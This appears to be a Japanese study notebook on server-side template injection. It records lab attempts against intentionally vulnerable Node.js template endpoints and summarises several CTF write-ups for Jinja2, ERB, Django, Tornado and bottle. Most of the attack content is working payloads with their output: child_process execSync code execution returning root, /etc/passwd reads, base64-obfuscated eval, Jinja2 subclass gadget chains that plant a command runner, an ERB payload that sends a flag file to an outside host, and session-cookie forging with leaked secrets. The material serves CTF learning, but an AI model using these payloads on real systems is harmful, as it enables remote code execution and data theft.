# E90XejidKrwlbKKmNTWVQV4Zb2RvNpmK
```
以下でも可！   
```python
jscode = "global.process.mainModule.require('child_process').execSync('ls').toString()"
#jscode = "require('child_process').execSync('ls').toString()" dont have require
#jscode = "require('child_process')"
#jscode = "1+1"
payload ='''{{range.constructor("return eval(\\"%s\\")")()}}'''%jscode

# /nunjucks?inj={{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('id').toString()\")")()}}
# WWKzsJvlaipkYpcwCFOPawDLcHtpcAhIuid=0(root) gid=0(root) groups=0(root)
# xgstTXsVI3B8BeMdhG6oSb6cCozyD7UQ
```
#### javascript (eval)
```js
// Javascript
app.use('/javascript', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + String(eval(tpl)) + randomstring.generate());
  }
});
```
https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44   
以下でファイル読んだりできる。   
```txt
http://192.168.99.100:15004/javascript?inj=require(%27fs%27).readdirSync(%27.%27).toString()
yPCpFdo60IRcRMGyG4evWdBRNWscMz09IkeFEEpcBIQEAREtFRPh9scGWd9pZjIV.js,connect-app.js,node_modules,package-lock.jsonp4KOTBIQhUrikadU5qAuPCq9f28WCiiI

http://192.168.99.100:15004/javascript?inj=require(%27fs%27).readdirSync(%27..%27).toString()
IXjrDkxpfDjDXkFGHJuZXuCR7mqMexcJbasetest.py,env_java_tests,env_node_tests,env_php_tests,env_py_tests,env_ruby_tests,run_channel_test.sh,run_java_tests.sh,run_node_tests.sh,run_php_tests.sh,run_python2_tests.sh,run_python3_tests.sh,run_ruby_tests.sh,test_channel.py,test_java_freemarker.py,test_java_velocity.py,test_node_dot.py,test_node_dust.py,test_node_ejs.py,test_node_javascript.py,test_node_marko.py,test_node_nunjucks.py,test_node_pug.py,test_php_php.py,test_php_smarty_secured.py,test_php_smarty_unsecured.py,test_php_twig_secured.py,test_php_twig_unsecured.py,test_py_jinja2.py,test_py_mako.py,test_py_python.py,test_py_tornado.py,test_ruby_erb.py,test_ruby_ruby.py,test_ruby_slim.py,tests.shR9nOTptanlyTaBR5wlBbENbc9mL6tRqP

http://192.168.99.100:15004/javascript?inj=require(%22fs%22).readFileSync(%22/etc/passwd%22).toString(%27utf8%27)
GNTXzKNvUVwjiltuHC2s9cfzcJUhKWOEroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```
以下でRCEできるはずだけどなんかできてない…。   
```txt
http://192.168.99.100:15004/javascript?inj=require(%22child_process%22).exec(%27id%27)
7c7WZtoA2NYGyIAqsIIpOkYAxk59tdvD[object Object]sTfcMuWmXVA1Sq0RRbh9SQ8R3VpETd8C

require('child_process').exec('wget http://localhost:9500/id=`id`');

WSL上で
>eval("require('child_process').exec('wget http://localhost:9500/id=`id`');")
をやると行けるのに…。
127.0.0.1 - - [22/Dec/2020 00:20:24] "GET /id=uid=1000(tomoki) HTTP/1.1" 404 -
```
以下のpython2スクリプトでRCEできた！   
```python
import base64

command_to_execute = "id"
code_to_execute = "global.process.mainModule.require('child_process').execSync('%s').toString()"%command_to_execute
code_b64_Encoded =base64.b64encode( code_to_execute )
payload = '''eval(Buffer('%s','base64').toString())'''%code_b64_Encoded
```
```txt
/javascript?inj=eval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoJ2lkJykudG9TdHJpbmcoKQ==','base64').toString())
1UMjgHZPMVKuxrMOLMQZ78CAe7aTqj6Kuid=0(root) gid=0(root) groups=0(root)
SN12DSCs8CE0ixZQJh0U5KBjBF3bQSlX
```
#### dot
```js
// doT
app.use('/dot', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + doT.template(tpl)({}) + randomstring.generate());
  }
});
```
わからん.   
以下でRCE可能！   
```txt
/dot?inj={{=%20global.process.mainModule.require(%27child_process%27).execSync(%27id%27).toString()%20}}
I59SiTdZt2tUfmpgRNTzp18Z3sOv5yUzuid=0(root) gid=0(root) groups=0(root)
yiTceAbMxwuVYlveU6jqsV3kiwiqIIq2
```
#### dust
```js
// Dust
app.use('/dust', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    
    console.log('PAYLOAD: ' + tpl);
    dust.debugLevel = "DEBUG"
    output = '';
    var compiled = dust.compile(tpl, "compiled");
    dust.loadSource(compiled);
    dust.render("compiled", {}, function(err, outp) { output = outp })
    res.end(randomstring.generate() + output + randomstring.generate());
  }
});
```
わからん   
```txt
http://192.168.99.100:15004/dot?inj={{aaa}}
ReferenceError: aaaout is not defined
    at eval (eval at doT.template (/apps/tests/env_node_tests/node_modules/dot/doT.js:133:11), <anonymous>:3:12)
    at /apps/tests/env_node_tests/connect-app.js:191:56
    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
```
ifヘルパーのevalインジェクションのやつ。dust-jsのバージョンによって動く。今回は動いてなさげ？？      
```txt
/dot?inj={@if cond="eval(Buffer('global.process.mainModule.require('child_process').execSync(Buffer('aWQ=', 'base64').toString()', 'base64').toString())"}{/if}
ie15G7raBJOyjxAkv6KIrkx7OcLa5POx{@if cond="eval(Buffer('global.process.mainModule.require('child_process').execSync(Buffer('aWQ=', 'base64').toString()', 'base64').toString())"}{/if}JigcTwTBHoPSNxnugLJ79BMgruhMLUQt
```
#### marko
```js
// Marko
app.use('/marko', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + marko.load(randomstring.generate(), tpl).renderSync() + randomstring.generate());
  }
});
```
わからん   
```txt
http://192.168.99.100:15004/marko?inj=*
SYRmrHgSweRm0BaVwR4d3xyXt6bi49qC<*></*>VtwiRsEOPnAdfCnUWqlIhTzF98oywEfo

http://192.168.99.100:15004/marko?inj={7*7}
Error: An error occurred while trying to compile template at path "/apps/tests/env_node_tests/pSpCYFucRUa3Efxxh7nLJMfNehPbZjLx". Error(s) in template:
1) [pSpCYFucRUa3Efxxh7nLJMfNehPbZjLx:1:0] Unrecognized tag: {7*7} - More details: https://github.com/marko-js/marko/wiki/Error:-Unrecognized-Tag

    at handleErrors (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:93:17)
    at Compiler.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:173:5)
    at _compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:86:31)
    at Object.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:112:10)
    at doLoad (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:162:39)
    at Object.load (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:47:14)
    at /apps/tests/env_node_tests/connect-app.js:228:45
    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
```
以下でRCEできるらしいけどなんかできてない…   
```txt
/marko?inj={{=global.process.mainModule.require('child_process').execSync('ls').toString()}}
Error: An error occurred while trying to compile template at path "/apps/tests/env_node_tests/Kh7NMWMQUQfgSl1VCpNe0qWLoCQoRBl5". Error(s) in template:
1) [Kh7NMWMQUQfgSl1VCpNe0qWLoCQoRBl5:1:0] Unrecognized tag: {{=global.process.mainModule.require('child_process').execSync('ls').toString()}} - More details: https://github.com/marko-js/marko/wiki/Error:-Unrecognized-Tag

    at handleErrors (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:93:17)
    at Compiler.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/Compiler.js:173:5)
    at _compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:86:31)
    at Object.compile (/apps/tests/env_node_tests/node_modules/marko/src/compiler/index.js:112:10)
    at doLoad (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:162:39)
    at Object.load (/apps/tests/env_node_tests/node_modules/marko/src/loader/index-default.js:47:14)
    at /apps/tests/env_node_tests/connect-app.js:228:45
    at call (/apps/tests/env_node_tests/node_modules/connect/index.js:239:7)
```
#### ejs
```js
// EJS
app.use('/ejs', function(req, res){
  if(req.url) {
    var url_parts = url.parse(req.url, true);

    var inj = url_parts.query.inj;
    var tpl = '';
    if('tpl' in url_parts.query) {
      // Keep the formatting a-la-python
      tpl = url_parts.query.tpl.replace('%s', inj);
    }
    else {
      tpl = inj;
    }
    res.end(randomstring.generate() + ejs.render(tpl) + randomstring.generate());
  }
});
```
https://www.hamayanhamayan.com/entry/2020/09/10/222147   
以下でRCEできた！   
```txt
http://192.168.99.100:15004/ejs?inj=***
f6x9fguWEC8K9UZBUrlMVjA7Rx4K1zxc***k4R2SGjAV3g07QZ9eVHYyTMUpte0LGyS

http://192.168.99.100:15004/ejs?inj=<%- global.process.mainModule.require('child_process').execSync('id') %>
ugOlkb8cWen3RKy5jmT3DZoF7bWwJ5Oauid=0(root) gid=0(root) groups=0(root)
UqfIaDZlPpRDsVBvEz04ssis4YEBwPkl
```
# writeup
## jinja2 render_template_string (ISC BugHunt101 CTF 2020)
https://caya8.hatenablog.com/entry/2020/07/16/083000   
- **entrypoint**    
Flaskのencode,decodeをするWebページがある。encode,decodeにはPOSTで`mode=encode`みたいに指定するが、encodeもdecodeも指定しない場合はエラーページを入力を含めて返す。ここのJinja2の`render_template_string`にSSTIがある。   
- **概要**    
以下の場所にSSTIできる！エラーを発生させて、その内容をSSTIするてきな？   
```python
if mode not in ['encode', 'decode']:
    abort(500, description=f'invalid mode ({mode=}) specified')
    
@app.errorhandler(500)
def internal_server_error(e):
    mascot = random.choice(list('🐌🐛🦟🐜🐝🐞🦂🦗🦋🕷'))  # just choose a mascot
    return render_template_string(f'{mascot} < {e.description}'), 500
```
- **Payload**    
`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`とかでRCEできるらしい！今回は同じ`render_template_string`を使っているwebsitesVulnerableToSSTIの以下の`python-jinja2`のやつを使った。   
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/python/python-jinja2/src/server.py   
以下でDocker環境を構築。   
```txt
tomok@LAPTOP-KSRL4PAP MINGW64 ~/docker_work/websitesVulnerableToSSTI/python/python-jinja2 (master)
$ bash runInDocker.sh 0.0.0.0
```
`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`でいけた！   
![image](https://user-images.githubusercontent.com/56021519/102914001-fc2bb880-44c2-11eb-8303-5cd2b4ca0641.png)   
`<pre>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}<!--`として`<pre>`を先頭につけて、末尾に`<!--`を付けると出力が綺麗になる。   
![image](https://user-images.githubusercontent.com/56021519/102914209-46149e80-44c3-11eb-892b-36ef254f6cff.png)   
## erb / bypass 正規表現 "^" "$" (harkaze ctf 2017)
https://st98.github.io/diary/posts/2017-12-08-harekaze-ssti-problem.html   
- **entrypoint**    
`params[:memo]`の値が`erb`のテンプレートエンジンに入力されてる。Rubyで入力を`/^[0-9A-Za-z]+$/`で正規表現で数字とアルファベットだけに制限してるが、Rubyでの`^`,`$`は脆弱だから使わない方がいい。これは改行文字を入れることで簡単にBypassできるのでここがentrypoint   
- **概要**    
ソースは以下の通り。   
```rb
def is_valid(s)
  return /^[0-9A-Za-z]+$/ =~ s
end

post '/add' do
  unless session[:memos]
    session[:memos] = []
  end
  unless is_valid(params[:memo])
    redirect to('/')
  end
  session[:memos].push params[:memo]
  // ここが脆弱！
  logger.info erb("memo ('#{params[:memo]}') added", :layout => false)
  redirect to('/')
end
```
Rubyの正規表現の危険性は以下を参照。   
https://blog.tokumaru.org/2014/03/z.html   
`memo=1%0Apwned!`みたいにすると以下のようになり、`!`を挿入できる！   
```txt
memo=1
pwned!
```
- **Payload**    
`require 'net/http'; Net::HTTP.get_print 'example.com', File.read('flag'), 8000`でFlagの中身を表示できるらしい。   
```txt
curl -v http://192.168.99.100:4567/add -d "memo=1%0A%3C%25%3D%20require%20'net%2Fhttp'%3B%20Net%3A%3AHTTP.get_print%20'example.com'%2C%20File.read('flag')%2C%208000%20%25%3E"
```
他にも、``<% abort `cat flag` %>``としてabortに引数として文字列を与えると、それをエラーメッセージとして表示するらしい。   
また、``<% session[:memos].push `cat flag` %>``でセッションにflagを保存することもできるらしい。   
## jinja2 RCE through __class__.__mro__ (BSidesSF CTF 2017)
https://jtwp470.hatenablog.jp/entry/2017/02/15/002304#Zumbo-3-250-pt   
- **entrypoint**    
FlaskのJinja2のtemplate変数に`{{  }}`を挿入できるので脆弱！   
- **概要**    
以下が脆弱な箇所。   
```python
template += "\n<!-- page: %s, src: %s -->\n" % (page, __file__)
```
jinja2のRCEには以下が参考。   
http://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/   
https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/   
- **Payload**    
```txt
// これでWebshell的なものをサーバー上に用意する
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/mocho.cfg', 'w').write('from subprocess import check_output;RUNCMD = check_output') }}

// これで任意コマンドを送信したら実行できる
{{ config['RUNCMD']('/usr/bin/curl http://vault:8080/flag',shell=True) }}
```
## Django str.format Information Disclosure (CODEGRAY CTF 2018)
https://blog.ssrf.in/post/codegray-ctf-writeup/   
- **entrypoint**    
python2.6以降で`format`関数の`"hello {user}".format(user="John")`みたいなのの`"hello {user}"`に該当する箇所をユーザーの入力にできる部分が脆弱！これでグローバル変数の値を読みだせる！   
- **概要**    
以下のソースの`template.format(email=email,user=user)`で`template`にユーザーの入力を挿入できる部分が脆弱！   
```python
# Create your views here.
def main(request):
    context = {}
    return render(request, 'mypage/index.html', context)

def subscribe(request):
    # Get parameter from user
    email = request.POST['email']; ... 👈
    user = request.user
    # Building json
    template = '%s' % email
    template = template.format(email=email, user=user)
    template = "{'result':true, 'email':'"+template+"'}"
```
python3のformatに関する参考は以下。   
https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/   
https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/   
以下のように`.format`の左側のやつを指定できるとき、以下の手法でグローバル変数にアクセスできる！   
```python
CONFIG = { 
    "KEY": "ASXFYFGK78989"
} 
  
class PeopleInfo: 
    def __init__(self, fname, lname): 
        self.fname = fname 
        self.lname = lname 
  
def get_name_for_avatar(avatar_str, people_obj): 
    return avatar_str.format(people_obj = people_obj) 
    
people = PeopleInfo('GEEKS', 'FORGEEKS') 
  
st = "Avatar_{people_obj.fname}_{people_obj.lname}"
print(get_name_for_avatar(st, people_obj = people) )
# Avatar_GEEKS_FORGEEKS

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
print(get_name_for_avatar(st, people_obj = people) )
# ASXFYFGK78989
```
- **Payload**    
```txt
{email}{user.set_password.__globals__[auth].admin.settings.SECRET_FLAG}

// 以下のように返ってくるらしい
{'result':true, 'email':'{email}{user.set_password.__globals__[auth].admin.settings.SECRET_FLAG}FLAG{IU_Is_the_b3st_singer_ev3r!}'}
```

## jinja2 / LFI / session['']に暗号化鍵で暗号化した値をセット (ASIS_CTF 2017 Golem)
https://github.com/bl4de/ctf/blob/master/2017/ASIS_CTF_2017/Golem/Golem_Web_writeup.md   
- **entrypoint**    
LFIができることがまずわかっていて、そこから`../../../proc/self/cmdline`で現在のプロセスを実行するために使われたコマンドを特定して、そこから`.ini`ファイルが見つかってその`.ini`ファイルを読むとWebのserver.pyのフルパスがわかってそれをLFIする。   
`render_template_string`にユーザーの入力が入るのでSSTI可能！   
- **概要**    
`session['golem']`の値がセットされていないければ`session['golem']`に`GET ?golem=`の値をセットしてそれが`template`変数に入る。ここで`GET ?golem=`の値は`.`,`_`,`{`,`}`がフィルタリングされる。   
`GET ?golem=`の値をセットせず、`session['golem']`の値がセットされていれば、この値をそのまま`template`変数に挿入して、フィルタリングなしでSSTIできる！   
```python
execfile('flag.py')
execfile('key.py')

FLAG = flag
app.secret_key = key


@app.route("/golem", methods=["GET", "POST"])
def golem():
    if request.method != "POST":
        return redirect(url_for("index"))

    golem = request.form.get("golem") or None

    if golem is not None:
        golem = golem.replace(".", "").replace(
            "_", "").replace("{", "").replace("}", "")

    if "golem" not in session or session['golem'] is None:
        session['golem'] = golem

    template = None

    if session['golem'] is not None:
        template = '''{% % extends "layout.html" % %}
		{% % block body % %}
		<h1 > Golem Name < /h1 >
		<div class ="row >
		<div class = "col-md-6 col-md-offset-3 center" >
		Hello: % s, why you don't look at our <a href=' / article?name = article'> article < /a >?
		< / div >
		< / div >
		{% % endblock % %}
		''' % session['golem']

        print

        session['golem'] = None

    return render_template_string(template)
```
`session['golem']`、つまり`Cookie: golem=aaaaa`みたいに値をセットするにはFlaskでは`app.secret_key`で暗号化(?)されることになる。つまり任意の値をCookieにセットするには、この暗号化キーを特定して、暗号化したデータをCookieにセットすればよい。   
今回は暗号化キーは`key.py`から読み込んでいるので、LFIでその内容を出力する。   

- **Payload**    
以下でLFIによって特定した暗号化キーでCookieの値を暗号化する。   
```python
from flask import (
    Flask,
    session)
from flask.ext.session import Session


app = Flask(__name__)
app.secret_key = "7h15_5h0uld_b3_r34lly_53cur3d"

@app.route('/')
def hello_world():
    session["golem"] = "{{''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()}}" 

    print session
    return session["golem"]
```
これを実行して、暗号化した値をCookieにセットすればFlagゲット！   
## Jinja2 bypass "." "_" / (Asis CTF Quals 2019)
https://fireshellsecurity.team/asisctf-fort-knox/   
- **entrypoint**    
ソースにアクセスできて、`t = Template(question)`がJinja2の脆弱とわかる。   
- **概要**    
以下より、`.`,`_`がフィルタリングされていて、これをBypassしてSSTIしないといけない。   
```python
from flask import Flask, session
from flask_session import Session
from flask import request
from flask import render_template
from jinja2 import Template
 
import fort
 
Flask.secret_key = fort.SECKEY
 
app = Flask(__name__)
app.config['SESSION_TYPE'] = 'filesystem'
app.config['TEMPLATES_AUTO_RELOAD'] = True
Session(app)
 
@app.route("/")
def main():
    return render_template("index.html")
 
@app.route("/ask", methods = ["POST"])
def ask():
    question = request.form["q"]
    for c in "._%":
        if c in question:
            return render_template("no.html", err = "no " + c)
    try:
        t = Template(question)
        t.globals = {}
        answer = t.render({
            "history": fort.history(),
            "credit": fort.credit(),
            "trustworthy": fort.trustworthy()
        })
    except:
        return render_template("no.html", err = "bad")
    return render_template("yes.html", answer = answer)
 
@app.route("/door/<door>")
def door(door):
    if fort.trustworthy():
        return render_template("flag.html", flag = fort.FLAG)
    doorNum = 0
    if door is not None:
        doorNum = int(door)
    if doorNum > 0 and doorNum < 7:
        fort.visit(doorNum)
        return render_template("door.html", door = doorNum)
    return render_template("no.html", err = "Door not found!")
```
`{{ [[]|map|string|list][0][20] }}`で`_`   
`[1|float|string|list][0][1]`で`.`が出力できる！   
- **Payload**    
書かれてるやつがどれもJinja2の環境で動いてない…理解不足…   

## bottle / zip slip in tarFile (InterKosenCTF 2020 miniblog) 
https://ark4rk.hatenablog.com/entry/2020/09/07/004439#web-miniblog   
https://hackmd.io/@ptr-yudai/HylUWdLlD   
https://qiita.com/kusano_k/items/f0774d1fd0aa0ee8f72f   
- **entrypoint**    
blogが作成できるWebページがあって、テンプレートも変更できるようになっている。しかし、`{{}}`や`%`が使えないように制限されているため普通にSSTIできない。   
画像ファイルなどをアップロードするのにtarファイルにしてからそれをサーバー上で解凍しているので、zip slipによってtemplateを上書きすれば、SSTIのフィルタリング無しでtempalteを上書きできる。   
- **概要**    
以下の`/update`では正規表現`r"{{!?[a-zA-Z0-9_]+}}"`によってSSTIができない。   
```python
@route("/update", method="POST")
def do_update_template():
    username = get_username()
    if not username:
        return abort(400)

    content = request.forms.get("content")
    if not content:
        return abort(400)

    if "%" in content:
        return abort(400, "forbidden")

    for brace in re.findall(r"{{.*?}}", content):
        if not re.match(r"{{!?[a-zA-Z0-9_]+}}", brace):
            return abort(400, "forbidden")

    template_path = "userdir/{userid}/template".format(userid=users[username]["id"])
    with open(template_path, "w") as f:
        f.write(content)

    redirect("/")
```
`tarpath`にあるtarファイルを`attachments_dir`に解凍するときに、解凍するときのファイル目が`../template`なら、`attachments_dir`より上のディレクトリのtemplateに上書きできる！   
このZip Slipという脆弱性がPythonのtar関係のライブラリにもあるが直ってないらしい…   
https://bugs.python.org/issue21109   
zip slipについて   
https://cililog.hatenablog.com/entry/2018/09/02/183220   
```python
@route("/upload", method="POST")
def do_upload():
    username = get_username()
    if not username:
        return abort(400)

    attachment = request.files.get("attachment")
    if not attachment:
        return abort(400)

    tarpath = 'tmp/{}'.format(uuid4().hex)
    attachments_dir = "userdir/{userid}/attachments/".format(userid=users[username]["id"])
    attachment.save(tarpath)
    try:
        tarfile.open(tarpath).extractall(path=attachments_dir)
    except (ValueError, RuntimeError):
        pass
    os.remove(tarpath)
    redirect("/")
```
https://alamot.github.io/path_traversal_archiver/   
このツールを使ってパストラバーラルファイル名をtarファイルに簡単に埋め込むことができる。   
- **Payload**    
```txt
// 以下のtemplateというファイルを作成する
<%
    import os

    n = 5
    xs = []
    for i in range(n):
        xs.append(os.listdir(("../" * i) + "."))
    end
%>
% for x in xs:
{{x}}<br>
% end

// 以下で細工したtar.gzファイルを作成してアップロードすると"ls ../"が実行できる
$ python path_traversal_archiver.py template xxx.tar.gz -l 1
```
## tornado / obtain Cookie's secret_key (csictf 2020 The Usual Suspects)
https://dunsp4rce.github.io/csictf-2020/web/2020/07/21/The-Usual-Suspects.html   
- **entrypoint**    
`?icecream=`のGETの中にバッククォートを挿入するとerrorが返るのでSSTI可能とわかる。Flagが出る条件は`admin`というCookieの値が`false`じゃなくて`true`になることらしいので、SSTIでCookieの暗号化に使われているsecret keyを特定する。   
- **概要**    
`?icecream={{globals()}}`を送信するといかが返るのでTornadoとわかる。   
グローバル名前空間にあるシンボル一覧(変数とかオブジェくトとかメソッドとか？)が返るらしい。   
```txt
'application': <tornado.web.Application object at 0x7f2976579750>,

// 他にも以下たちが返るらしい？
'escape', 'xhtml_escape', 'url_escape', 'json_encode', 'squeeze', 'linkify', 'datetime', '_tt_utf8', '_tt_string_types', '__name__', '__loader__', 'chocolate', 'vanilla', 'butterscotch', 'application', 'secret', '__builtins__', '_tt_execute'
```
この中で`application`オブジェクトが怪しいので、`dir(application)`でメンバーを見れるらしい？   
```txt
['__call__', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_load_ui_methods', '_load_ui_modules', 'add_handlers', 'add_transform', 'default_host', 'default_router', 'find_handler', 'get_handler_delegate', 'listen', 'log_request', 'on_close', 'reverse_url', 'settings', 'start_request', 'transforms', 'ui_methods', 'ui_modules', 'wildcard_router']
```
この中で`settings`オブジェクトが怪しいらしいので`{{application.settings}}`で`'cookie_secret': 'MangoDB\n'`が返って秘密鍵がわかる？   
- **Payload**    
以下で暗号化したCookieを作成すればOK。   
```python
import tornado.ioloop
import tornado.web
import time

class User(tornado.web.RequestHandler):

    def get(self):
        cookieName = "admin"        
        self.set_secure_cookie(cookieName, 'true')

application = tornado.web.Application([
    (r"/", User),
], cookie_secret="MangoDB\n")

if __name__ == "__main__":
    application.listen(8888)
    tornado.ioloop.IOLoop.instance().start()
```
## sample
https://dunsp4rce.github.io/HacktivityCon-CTF/web/2020/08/03/Template-Shack.html   
- **entrypoint**    
- **概要**    
- **Payload**    
## sample
- **entrypoint**    
- **概要**    
- **Payload**    
## sample
- **entrypoint**    
- **概要**    
- **Payload**    

## sample
- **entrypoint**    
- **概要**    
- **Payload**    

## Docker環境があるやつ(復習用)
### The Usual Suspects (csictf 2020)
https://github.com/csivitu/ctf-challenges/tree/master/web/The%20Usual%20Suspects   
### miniblog (InterKosenCTF 2020)
https://github.com/theoremoon/InterKosenCTF2020-challenges/tree/master/web/miniblog   

# メモ
escapeHTMLってどんな感じでエスケープする？   
動的な文字列連結は脆弱になりがちっぽい   
変数名のワードリストがあるぽい   
# 参考
https://portswigger.net/web-security/server-side-template-injection   
SSTIの概要   
https://portswigger.net/research/server-side-template-injection   
各テンプレートエンジンにおけるSSTIの例   
https://opsecx.com/index.php/2016/07/03/server-side-template-injection-in-tornado/   
TornadoでのSSTI   
https://github.com/epinna/tplmap   
TPLMAPというSSTI検知ツール。脆弱な環境もテスト用にある。   
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI   
SSTIの脆弱なWebサイト。Docker環境。   
https://www.hamayanhamayan.com/entry/2020/09/10/222147   
SSTIの概要。CTFでのSSTI。   
https://io.cyberdefense.jp/entry/2017/06/12/Server-Side_Template_Injection   
SSTIの説明。日本語。   
https://ierae.co.jp/blog/osc2016do-webappsec/   
SSTIの説明。日本語。   
https://github.com/DiogoMRSilva/websitesVulnerableToSSTI/blob/master/README.md   
ここに大体のSSTIの脆弱なソースとそのExploitの例がある。神。   
